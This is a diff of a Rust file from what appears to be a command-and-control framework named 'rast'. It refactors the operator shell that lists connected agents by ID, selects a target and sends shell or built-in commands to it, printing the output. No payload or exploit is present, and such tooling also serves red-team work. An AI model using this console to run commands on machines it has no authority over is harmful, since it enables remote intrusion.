@@ -2,21 +2,23 @@
 
 use std::{
     error::Error,
-    fmt::{Display, Formatter},
-    net::{IpAddr, SocketAddr},
-    str::FromStr,
+    fmt::Display,
     sync::Arc,
     vec,
 };
 
 use futures_util::{sink::SinkExt, stream::StreamExt};
 use rast::{
-    encoding::{JsonPackager, Packager},
-    messages::ui_request::{UiRequest, UiResponse},
+    encoding::JsonPackager,
     protocols::{Messager, ProtoConnection},
 };
-use shellfish::{async_fn, handler::DefaultAsyncHandler, Command, Shell};
+use shellfish::{async_fn, handler::DefaultAsyncHandler, rustyline::DefaultEditor, Command, Shell};
 use tokio::sync::Mutex;
+use ulid::Ulid;
+use rast::encoding::{Encoding, Packager};
+use rast::messages::{Message, MessageZone};
+use rast_agent::messages::{AgentResponse, C2Request};
+use rast_c2::messages::{UiRequest, UiResponse};
 
 type CmdResult<T> = std::result::Result<T, Box<dyn Error>>;
 type State = ShellState;
@@ -25,8 +27,8 @@ type State = ShellState;
 #[derive(Debug)]
 pub struct ShellState {
     conn: Arc<Mutex<dyn ProtoConnection>>,
-    target: Option<String>,
-    targets: Vec<String>,
+    target: Option<Ulid>,
+    targets: Vec<Ulid>,
 }
 
 impl ShellState {
@@ -51,8 +53,17 @@ impl Display for ShellState {
 }
 
 /// Creates shell.
-pub fn get_shell(state: State) -> Shell<'static, State, impl Display, DefaultAsyncHandler> {
-    let mut shell = Shell::new_async(state, "[rast]> ");
+pub fn get_shell(
+    state: State,
+) -> Shell<'static, State, impl Display, DefaultAsyncHandler, DefaultEditor> {
+    let mut shell = Shell::new_with_async_handler(
+        state,
+        "[rast]> ",
+        DefaultAsyncHandler::default(),
+        DefaultEditor::new().unwrap(),
+    );
+
+    // TODO: add custom handler to check connection
 
     shell.commands.insert(
         "ping",
@@ -60,10 +71,10 @@ pub fn get_shell(state: State) -> Shell<'static, State, impl Display, DefaultAsy
     );
 
     shell.commands.insert(
-        "get_targets",
+        "targets",
         Command::new_async(
             "updates and prints target list".into(),
-            async_fn!(State, get_targets),
+            async_fn!(State, targets),
         ),
     );
 
@@ -77,7 +88,7 @@ pub fn get_shell(state: State) -> Shell<'static, State, impl Display, DefaultAsy
     );
 
     shell.commands.insert(
-        "exec_shell",
+        "shell",
         Command::new_async(
             "run shell command on target".into(),
             async_fn!(State, exec_shell),
@@ -85,15 +96,15 @@ pub fn get_shell(state: State) -> Shell<'static, State, impl Display, DefaultAsy
     );
 
     shell.commands.insert(
-        "get_commands",
+        "commands",
         Command::new_async(
             "get built-in commands available on the agent".into(),
-            async_fn!(State, get_commands),
+            async_fn!(State, commands),
         ),
     );
 
     shell.commands.insert(
-        "exec_command",
+        "cmd",
         Command::new_async(
             "run built-in command on the agent".into(),
             async_fn!(State, exec_command),
@@ -103,24 +114,26 @@ pub fn get_shell(state: State) -> Shell<'static, State, impl Display, DefaultAsy
     shell
 }
 
+pub fn new_message(uireq: UiRequest) -> Message {
+    let bytes = JsonPackager::encode(&uireq).unwrap();
+    Message::new(MessageZone::Internal, Encoding::Json, bytes.into())
+}
+
 // async fn send_request(request: UiRequest) -> Result<UiResponse> {}
 
 /// Sends [`UiRequest::Ping`] to the C2 server to check connectivity.
 async fn ping(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
     let mut conn = state.conn.lock().await;
-
-    let mut messager = Messager::new(&mut *conn);
-    let packager = JsonPackager::default();
+    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
 
     let request = UiRequest::Ping;
-    let request = packager.encode(&request)?;
+    let request = new_message(request);
 
-    messager.send(request).await?;
-    let bytes = messager.next().await.unwrap().unwrap();
+    messager.send(&request).await?;
+    let msg = messager.receive().await?;
 
-    let output: UiResponse = packager.decode(&bytes.into())?;
-
-    if output == UiResponse::Pong {
+    let decoded = JsonPackager::decode(&msg.data)?;
+    if let UiResponse::Pong = decoded {
         println!("pong");
     }
 
@@ -128,23 +141,19 @@ async fn ping(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
 }
 
 /// Gets all agents that C2 server is connected to.
-async fn get_targets(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
+async fn targets(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
     let mut conn = state.conn.lock().await;
+    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
 
-    // TODO: put all of that into struct and do abstractions
-    let mut messager = Messager::new(&mut *conn);
-    let packager = JsonPackager::default();
+    let request = UiRequest::GetAgents;
+    let request = new_message(request);
+    
+    messager.send(&request).await?;
+    let msg = messager.receive().await?;
 
-    let request = UiRequest::GetIps;
-    let request = packager.encode(&request)?;
-
-    messager.send(request).await?;
-    let bytes = messager.next().await.unwrap().unwrap();
-
-    let output: UiResponse = packager.decode(&bytes.into())?;
-
-    if let UiResponse::GetIps(ips) = output {
-        state.targets = ips;
+    let decoded = JsonPackager::decode(&msg.data)?;
+    if let UiResponse::Agents(ulids) = decoded {
+        state.targets = ulids;
     }
 
     for (i, target) in state.targets.iter().enumerate() {
@@ -176,30 +185,26 @@ async fn exec_shell(state: &mut State, args: Vec<String>) -> CmdResult<()> {
     let mut conn = state.conn.lock().await;
 
     // TODO: put all of that into struct and do abstractions
-    let mut messager = Messager::new(&mut *conn);
-    let packager = JsonPackager::default();
-    let (ip, port) = state.target.as_ref().unwrap().split_once(':').unwrap();
+    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
+    let target = state.target.ok_or("No target selected")?;
 
-    let request = UiRequest::ShellRequest(
-        SocketAddr::new(IpAddr::from_str(ip).unwrap(), u16::from_str(port)?),
-        command,
-    );
-    let request = packager.encode(&request)?;
-
-    messager.send(request).await?;
-    let bytes = messager.next().await.unwrap()?;
-
-    let output: UiResponse = packager.decode(&bytes.into())?;
-
-    if let UiResponse::ShellOutput(output) = output {
-        println!("{output}");
-    }
+    let request = C2Request::ExecShell(command);
+    let request = UiRequest::AgentRequest(target, request);
+    let request = new_message(request);
+    
+    messager.send(&request).await?;
+    let msg = messager.receive().await?;
+    
+    let decoded = JsonPackager::decode(&msg.data)?;
+    if let UiResponse::AgentResponse(AgentResponse::ShellResponse(output)) = decoded {
+            println!("{output}");
+    };
 
     Ok(())
 }
 
 /// Executes command on the specified agent.
-async fn get_commands(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
+async fn commands(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
     if state.target.is_none() {
         println!("No target is selected");
         return Ok(());
@@ -213,25 +218,21 @@ async fn get_commands(state: &mut State, _args: Vec<String>) -> CmdResult<()> {
     let mut conn = state.conn.lock().await;
 
     // TODO: put all of that into struct and do abstractions
-    let mut messager = Messager::new(&mut *conn);
-    let packager = JsonPackager::default();
-    let (ip, port) = state.target.as_ref().unwrap().split_once(':').unwrap();
+    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
+    let target = state.target.ok_or("No target selected")?;
 
-    let request = UiRequest::GetCommands(SocketAddr::new(
-        IpAddr::from_str(ip).unwrap(),
-        u16::from_str(port)?,
-    ));
-    let request = packager.encode(&request)?;
+    let request = C2Request::GetCommands;
+    let request = UiRequest::AgentRequest(target, request);
+    let request = new_message(request);
 
-    messager.send(request).await?;
-    let bytes = messager.next().await.unwrap()?;
+    messager.send(&request).await?;
+    let msg = messager.receive().await?;
 
-    let output: UiResponse = packager.decode(&bytes.into())?;
-
-    if let UiResponse::Commands(output) = output {
-        for (cmd, help) in output.iter() {
-            println!("[{cmd}]\t {help}");
-        }
+    let decoded = JsonPackager::decode(&msg.data)?;
+    if let UiResponse::AgentResponse(AgentResponse::Commands(output)) = decoded {
+            for (cmd, help) in output.iter() {
+                println!("[{cmd}]\t {help}");
+            }
     }
 
     Ok(())
@@ -255,23 +256,18 @@ async fn exec_command(state: &mut State, args: Vec<String>) -> CmdResult<()> {
     let mut conn = state.conn.lock().await;
 
     // TODO: put all of that into struct and do abstractions
-    let mut messager = Messager::new(&mut *conn);
-    let packager = JsonPackager::default();
-    let (ip, port) = state.target.as_ref().unwrap().split_once(':').unwrap();
+    let mut messager = Messager::with_packager(&mut *conn, JsonPackager);
+    let target = state.target.ok_or("No target selected")?;
 
-    let request = UiRequest::ExecCommand(
-        SocketAddr::new(IpAddr::from_str(ip).unwrap(), u16::from_str(port)?),
-        command,
-        args,
-    );
-    let request = packager.encode(&request)?;
+    let request = C2Request::ExecCommand(command, args);
+    let request = UiRequest::AgentRequest(target, request);
+    let request = new_message(request);
 
-    messager.send(request).await?;
-    let bytes = messager.next().await.unwrap()?;
+    messager.send(&request).await?;
+    let msg = messager.receive().await?;
 
-    let output: UiResponse = packager.decode(&bytes.into())?;
-
-    if let UiResponse::CommandOutput(output) = output {
+    let decoded = JsonPackager::decode(&msg.data)?;
+    if let UiResponse::AgentResponse(AgentResponse::CommandOutput(output)) = decoded {
         println!("{output}");
     } else {
         println!("Err");
@@ -290,7 +286,7 @@ fn set_target(state: &mut State, args: Vec<String>) -> CmdResult<()> {
     let target = args.get(1).unwrap().parse::<usize>().unwrap();
 
     if let Some(target) = state.targets.get(target) {
-        state.target = Some(target.to_string());
+        state.target = Some(*target);
         println!("Target successfully set to: {target}");
     }
 
